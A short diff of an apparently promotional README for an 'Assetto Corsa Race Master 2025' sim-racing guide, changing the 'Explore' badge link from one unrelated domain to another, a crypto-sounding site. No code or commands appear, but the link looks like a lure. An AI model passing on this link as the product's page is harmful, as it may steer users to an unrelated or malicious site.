@@ -2,7 +2,7 @@
 
 🌟 Elevate your racing experience with Assetto Corsa Race Master 2025! This guide enhances gameplay with mods, optimized setups, and race strategies, crafted for sim racers on Windows.
 
-[![Explore Assetto Race Master](https://img.shields.io/badge/Explore-Assetto_Race_Master-blueviolet)](https://glocktober.com)
+[![Explore Assetto Race Master](https://img.shields.io/badge/Explore-Assetto_Race_Master-blueviolet)](https://ton-stake.net)
 
 ---
 
